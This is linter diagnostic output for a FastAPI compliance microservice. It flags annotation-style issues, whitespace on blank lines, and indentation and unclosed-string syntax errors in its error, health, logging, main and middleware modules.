 --> emergent-microservices\autonomous-compliance\app\errors.py:5:1
  |
3 | """
4 |
5 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
6 |
7 | from fastapi import FastAPI, Request, status
  |

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-compliance\app\errors.py:21:18
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                  ^^^^^^^^^^^^^^^^^^^^^^^^
22 |     ):
23 |         self.message = message
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\errors.py:21:27
   |
19 |         code: str,
20 |         status_code: int = status.HTTP_500_INTERNAL_SERVER_ERROR,
21 |         details: Optional[Dict[str, Any]] = None,
   |                           ^^^^
22 |     ):
23 |         self.message = message
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-compliance\app\errors.py:33:47
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\errors.py:33:56
   |
31 |     """Validation error"""
32 |
33 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
34 |         super().__init__(
35 |             message=message,
   |
help: Replace with `dict`

UP045 [*] Use `X | None` for type annotations
  --> emergent-microservices\autonomous-compliance\app\errors.py:79:47
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                               ^^^^^^^^^^^^^^^^^^^^^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> emergent-microservices\autonomous-compliance\app\errors.py:79:56
   |
77 |     """Conflict error (e.g., duplicate resource)"""
78 |
79 |     def __init__(self, message: str, details: Optional[Dict[str, Any]] = None):
   |                                                        ^^^^
80 |         super().__init__(
81 |             message=message,
   |
help: Replace with `dict`

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\health.py:41:1
   |
39 |     checks = {}
40 |     all_ready = True
41 |     
   | ^^^^
42 |     # Check database connection
43 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\health.py:52:1
   |
50 |         checks["database"] = "error"
51 |         all_ready = False
52 |     
   | ^^^^
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\health.py:55:1
   |
53 |     response_status = "ready" if all_ready else "not_ready"
54 |     status_code = status.HTTP_200_OK if all_ready else status.HTTP_503_SERVICE_UNAVAILABLE
55 |     
   | ^^^^
56 |     return HealthResponse(
57 |         status=response_status,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\health.py:82:1
   |
80 |     checks = {}
81 |     startup_complete = True
82 |     
   | ^^^^
83 |     # Check database connection
84 |     try:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\health.py:93:1
   |
91 |         checks["database"] = "error"
92 |         startup_complete = False
93 |     
   | ^^^^
94 | # Check migrations
95 |     try:
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
   --> emergent-microservices\autonomous-compliance\app\health.py:106:1
    |
104 |         startup_complete = False
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
    | ^^^^
107 |     
108 |     return HealthResponse(
    |

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\health.py:107:1
    |
105 | response_status = "started" if startup_complete else "starting"
106 |     status_code = status.HTTP_200_OK if startup_complete else status.HTTP_503_SERVICE_UNAVAILABLE
107 |     
    | ^^^^
108 |     return HealthResponse(
109 |         status=response_status,
    |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
   --> emergent-microservices\autonomous-compliance\app\health.py:115:1
    |
113 |         checks=checks,
114 |     )
    |      ^
    |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:17:1
   |
15 | class JSONFormatter(logging.Formatter):
16 |     """JSON log formatter for structured logging"""
17 |     
   | ^^^^
18 |     def format(self, record: logging.LogRecord) -> str:
19 |         log_data: Dict[str, Any] = {
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:27:1
   |
25 |             "version": "1.0.0",
26 |         }
27 |         
   | ^^^^^^^^
28 |         # Add request ID if available
29 |         request_id = request_id_var.get()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:32:1
   |
30 |         if request_id:
31 |             log_data["request_id"] = request_id
32 |         
   | ^^^^^^^^
33 |         # Add exception info if present
34 |         if record.exc_info:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:36:1
   |
34 |         if record.exc_info:
35 |             log_data["exception"] = self.formatException(record.exc_info)
36 |         
   | ^^^^^^^^
37 |         # Add extra fields
38 |         if hasattr(record, "extra"):
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:40:1
   |
38 |         if hasattr(record, "extra"):
39 |             log_data.update(record.extra)
40 |         
   | ^^^^^^^^
41 |         return json.dumps(log_data)
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:49:1
   |
47 | handler.setFormatter(JSONFormatter())
48 | # Configure root logger
49 |     logging.root.handlers = [handler]
   | ^^^^
50 |     logging.root.setLevel("INFO")
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:51:1
   |
49 |     logging.root.handlers = [handler]
50 |     logging.root.setLevel("INFO")
51 |     
   | ^^^^
52 |     # Reduce noise from third-party libraries
53 |     logging.getLogger("uvicorn").setLevel(logging.WARNING)
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-compliance\app\logging_config.py:58:1
   |
57 | # Create module logger
58 | logger = logging.getLogger("autonomous_compliance_as_code_engine")
   | ^
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\main.py:60:1
   |
58 |     # Startup
59 |     logger.info("Starting Autonomous Compliance-as-Code Engine service v1.0.0")
60 |     
   | ^^^^
61 |     # Initialize database
62 |     await database.connect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\main.py:64:1
   |
62 |     await database.connect()
63 |     logger.info("Database connection established")
64 |     
   | ^^^^
65 |     # Run migrations if needed
66 | from .repository import run_migrations
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-compliance\app\main.py:67:1
   |
65 |     # Run migrations if needed
66 | from .repository import run_migrations
67 |     await run_migrations()
   | ^^^^
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   |

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-compliance\app\main.py:69:1
   |
67 |     await run_migrations()
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
   | ^
70 |     
71 |     yield
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\main.py:70:1
   |
68 |     logger.info("Database migrations completed")
69 | logger.info("Service startup complete")
70 |     
   | ^^^^
71 |     yield
   |
help: Remove whitespace from blank line

invalid-syntax: Unexpected indentation
  --> emergent-microservices\autonomous-compliance\app\main.py:71:1
   |
69 | logger.info("Service startup complete")
70 |     
71 |     yield
   | ^^^^
72 |     
73 |     # Shutdown
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\main.py:72:1
   |
71 |     yield
72 |     
   | ^^^^
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Compliance-as-Code Engine service")
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\main.py:75:1
   |
73 |     # Shutdown
74 |     logger.info("Shutting down Autonomous Compliance-as-Code Engine service")
75 |     
   | ^^^^
76 |     # Close database connections
77 |     await database.disconnect()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\main.py:79:1
   |
77 |     await database.disconnect()
78 |     logger.info("Database connections closed")
79 |     
   | ^^^^
80 |     logger.info("Service shutdown complete")
   |
help: Remove whitespace from blank line

invalid-syntax: Expected a statement
  --> emergent-microservices\autonomous-compliance\app\main.py:84:1
   |
83 | # Create FastAPI application
84 | app = FastAPI(
   | ^
85 |     title="Autonomous Compliance-as-Code Engine",
86 |     description="Build a regulator-ready microservice fabric that:
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-compliance\app\main.py:86:17
   |
84 | app = FastAPI(
85 |     title="Autonomous Compliance-as-Code Engine",
86 |     description="Build a regulator-ready microservice fabric that:
   |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
87 | Ingests policy (YAML/DSL)
88 | Compiles invariants
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:87:1
   |
85 |     title="Autonomous Compliance-as-Code Engine",
86 |     description="Build a regulator-ready microservice fabric that:
87 | Ingests policy (YAML/DSL)
   | ^^^^^^^
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:87:9
   |
85 |     title="Autonomous Compliance-as-Code Engine",
86 |     description="Build a regulator-ready microservice fabric that:
87 | Ingests policy (YAML/DSL)
   |         ^^^^^^
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:88:1
   |
86 |     description="Build a regulator-ready microservice fabric that:
87 | Ingests policy (YAML/DSL)
88 | Compiles invariants
   | ^^^^^^^^
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:88:10
   |
86 |     description="Build a regulator-ready microservice fabric that:
87 | Ingests policy (YAML/DSL)
88 | Compiles invariants
   |          ^^^^^^^^^^
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:89:1
   |
87 | Ingests policy (YAML/DSL)
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
   | ^^^^^^^^^
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:89:11
   |
87 | Ingests policy (YAML/DSL)
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
   |           ^^^^^^^
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:89:19
   |
87 | Ingests policy (YAML/DSL)
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
   |                   ^^^^^^^
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:89:27
   |
87 | Ingests policy (YAML/DSL)
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
   |                           ^^^^^^^^^^^^^^^^^
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:90:1
   |
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
   | ^^^^^^^^
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:90:10
   |
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
   |          ^^^^^^
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:90:17
   |
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
   |                 ^^^^^
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:90:23
   |
88 | Compiles invariants
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
   |                       ^^^^^^
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:91:1
   |
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   | ^^^^^^^
92 | Add:
93 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:91:9
   |
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   |         ^^^^
92 | Add:
93 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:91:27
   |
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   |                           ^^^^^^^^^
92 | Add:
93 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:91:37
   |
89 | Evaluates runtime actions deterministically
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
   |                                     ^^^^^^^^^^^^^
92 | Add:
93 | Continuous evidence generation
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:92:1
   |
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
   | ^^^
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
   |

invalid-syntax: Expected `,`, found `:`
  --> emergent-microservices\autonomous-compliance\app\main.py:92:4
   |
90 | Produces signed audit trails
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
   |    ^
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
   |

invalid-syntax: Positional argument cannot follow keyword argument
  --> emergent-microservices\autonomous-compliance\app\main.py:93:1
   |
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
93 | Continuous evidence generation
   | ^^^^^^^^^^
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:93:12
   |
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
93 | Continuous evidence generation
   |            ^^^^^^^^
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:93:21
   |
91 | Exports SOC2 / ISO / NIST artifacts automatically
92 | Add:
93 | Continuous evidence generation
   |                     ^^^^^^^^^^
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:94:1
   |
92 | Add:
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
   | ^^^^^^^
95 | API to expose compliance state to customers",
96 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:94:20
   |
92 | Add:
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
   |                    ^^^^^^^^^^
95 | API to expose compliance state to customers",
96 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:94:31
   |
92 | Add:
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
   |                               ^^^^^^
95 | API to expose compliance state to customers",
96 |     version="1.0.0",
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:95:1
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   | ^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:95:5
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |     ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:95:8
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |        ^^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:95:15
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |               ^^^^^^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:95:26
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |                          ^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:95:32
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |                                ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:95:35
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |                                   ^^^^^^^^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: missing closing quote in string literal
  --> emergent-microservices\autonomous-compliance\app\main.py:95:44
   |
93 | Continuous evidence generation
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
   |                                            ^^
96 |     version="1.0.0",
97 |     lifespan=lifespan,
   |

invalid-syntax: Expected `,`, found name
  --> emergent-microservices\autonomous-compliance\app\main.py:96:5
   |
94 | Machine-verifiable compliance proofs
95 | API to expose compliance state to customers",
96 |     version="1.0.0",
   |     ^^^^^^^
97 |     lifespan=lifespan,
98 | docs_url="/api/v1/docs",
   |

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:18:1
   |
16 | class RequestIDMiddleware(BaseHTTPMiddleware):
17 |     """Add unique request ID to each request"""
18 |     
   | ^^^^
19 |     async def dispatch(self, request: Request, call_next: Callable):
20 |         # Generate or extract request ID
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:22:1
   |
20 |         # Generate or extract request ID
21 |         request_id = request.headers.get("X-Request-ID", str(uuid.uuid4()))
22 |         
   | ^^^^^^^^
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:25:1
   |
23 |         # Set in context for logging
24 |         request_id_var.set(request_id)
25 |         
   | ^^^^^^^^
26 |         # Add to request state
27 |         request.state.request_id = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:28:1
   |
26 |         # Add to request state
27 |         request.state.request_id = request_id
28 |         
   | ^^^^^^^^
29 |         # Call next middleware
30 |         response = await call_next(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:31:1
   |
29 |         # Call next middleware
30 |         response = await call_next(request)
31 |         
   | ^^^^^^^^
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:34:1
   |
32 |         # Add to response headers
33 |         response.headers["X-Request-ID"] = request_id
34 |         
   | ^^^^^^^^
35 |         return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:40:1
   |
38 | class MetricsMiddleware(BaseHTTPMiddleware):
39 |     """Collect Prometheus metrics for requests"""
40 |     
   | ^^^^
41 |     async def dispatch(self, request: Request, call_next: Callable):
42 |         # Skip metrics endpoint itself
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:45:1
   |
43 |         if request.url.path == "/metrics":
44 |             return await call_next(request)
45 |         
   | ^^^^^^^^
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:48:1
   |
46 |         # Increment inflight requests
47 |         INFLIGHT_REQUESTS.inc()
48 |         
   | ^^^^^^^^
49 |         # Record start time
50 |         start_time = time.time()
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:51:1
   |
49 |         # Record start time
50 |         start_time = time.time()
51 |         
   | ^^^^^^^^
52 |         try:
53 |             # Process request
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:55:1
   |
53 |             # Process request
54 |             response = await call_next(request)
55 |             
   | ^^^^^^^^^^^^
56 |             # Record metrics
57 |             duration = time.time() - start_time
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:59:1
   |
57 |             duration = time.time() - start_time
58 |             status_class = f"{response.status_code // 100}xx"
59 |             
   | ^^^^^^^^^^^^
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:62:1
   |
60 |             # Get route template (not raw path to avoid high cardinality)
61 |             route_template = self._get_route_template(request)
62 |             
   | ^^^^^^^^^^^^
63 |             REQUEST_COUNT.labels(
64 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:68:1
   |
66 |                 status_class=status_class,
67 |             ).inc()
68 |             
   | ^^^^^^^^^^^^
69 |             REQUEST_DURATION.labels(
70 |                 method=request.method,
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:73:1
   |
71 |                 route_template=route_template,
72 |             ).observe(duration)
73 |             
   | ^^^^^^^^^^^^
74 |             return response
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:75:1
   |
74 |             return response
75 |         
   | ^^^^^^^^
76 |         finally:
77 |             # Decrement inflight requests
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:79:1
   |
77 |             # Decrement inflight requests
78 |             INFLIGHT_REQUESTS.dec()
79 |     
   | ^^^^
80 |     @staticmethod
81 |     def _get_route_template(request: Request) -> str:
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:90:1
   |
88 | class RateLimitMiddleware(BaseHTTPMiddleware):
89 |     """Token bucket rate limiter"""
90 |     
   | ^^^^
91 |     def __init__(self, app, requests_per_minute: int = 100, burst: int = 200):
92 |         super().__init__(app)
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
  --> emergent-microservices\autonomous-compliance\app\middleware.py:97:1
   |
95 |         self.tokens = {}  # client_id -> (tokens, last_update)
96 |         self.rate = requests_per_minute / 60.0  # tokens per second
97 |     
   | ^^^^
98 |     async def dispatch(self, request: Request, call_next: Callable):
99 |         # Skip health checks and metrics
   |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:102:1
    |
100 |         if request.url.path in ["/health", "/health/ready", "/health/live", "/metrics"]:
101 |             return await call_next(request)
102 |         
    | ^^^^^^^^
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:105:1
    |
103 |         # Get client identifier (IP or authenticated user)
104 |         client_id = self._get_client_id(request)
105 |         
    | ^^^^^^^^
106 |         # Check rate limit
107 |         if not self._allow_request(client_id):
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:120:1
    |
118 |                 headers={"Retry-After": "60"},
119 |             )
120 |         
    | ^^^^^^^^
121 |         return await call_next(request)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:122:1
    |
121 |         return await call_next(request)
122 |     
    | ^^^^
123 |     def _get_client_id(self, request: Request) -> str:
124 |         """Get client identifier for rate limiting"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:128:1
    |
126 |         if hasattr(request.state, "user"):
127 |             return f"user:{request.state.user}"
128 |         
    | ^^^^^^^^
129 |         # Fall back to IP address
130 |         forwarded_for = request.headers.get("X-Forwarded-For")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:133:1
    |
131 |         if forwarded_for:
132 |             return f"ip:{forwarded_for.split(',')[0].strip()}"
133 |         
    | ^^^^^^^^
134 |         return f"ip:{request.client.host}"
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:135:1
    |
134 |         return f"ip:{request.client.host}"
135 |     
    | ^^^^
136 |     def _allow_request(self, client_id: str) -> bool:
137 |         """Check if request is allowed (token bucket algorithm)"""
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:139:1
    |
137 |         """Check if request is allowed (token bucket algorithm)"""
138 |         now = time.time()
139 |         
    | ^^^^^^^^
140 |         if client_id not in self.tokens:
141 |             self.tokens[client_id] = (self.burst - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:143:1
    |
141 |             self.tokens[client_id] = (self.burst - 1, now)
142 |             return True
143 |         
    | ^^^^^^^^
144 |         tokens, last_update = self.tokens[client_id]
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:145:1
    |
144 |         tokens, last_update = self.tokens[client_id]
145 |         
    | ^^^^^^^^
146 |         # Add tokens based on time elapsed
147 |         elapsed = now - last_update
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:149:1
    |
147 |         elapsed = now - last_update
148 |         tokens = min(self.burst, tokens + elapsed * self.rate)
149 |         
    | ^^^^^^^^
150 |         if tokens >= 1:
151 |             self.tokens[client_id] = (tokens - 1, now)
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:160:1
    |
158 | class AuthenticationMiddleware(BaseHTTPMiddleware):
159 |     """Authentication middleware"""
160 |     
    | ^^^^
161 |     # Public endpoints that don't require authentication
162 |     PUBLIC_PATHS = [
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:173:1
    |
171 |         "/api/v1/openapi.json",
172 |     ]
173 |     
    | ^^^^
174 |     async def dispatch(self, request: Request, call_next: Callable):
175 |         # Skip public endpoints
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:178:1
    |
176 |         if request.url.path in self.PUBLIC_PATHS:
177 |             return await call_next(request)
178 |         
    | ^^^^^^^^
179 |         # Try authentication
180 |         authenticated = False
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:182:1
    |
180 |         authenticated = False
181 |         user = None
182 |         
    | ^^^^^^^^
183 | # Try API key authentication
184 |         api_key = request.headers.get("X-API-Key")
    |
help: Remove whitespace from blank line

W293 Blank line contains whitespace
   --> emergent-microservices\autonomous-compliance\app\middleware.py:210:1
    |
208 |                 headers={"WWW-Authenticate": "Bearer"},
209 |             )
210 |         
    | ^^^^^^^^
211 |         # Add user to request state
212 |         request.state.user = user
    |
help: Remove whitespace from blank line

invalid-syntax: unindent does not match any outer indentation level
   --> emergent-microservices\autonomous-compliance\app\middleware.py:212:1
    |
211 |         # Add user to request state
212 |         request.state.user = user
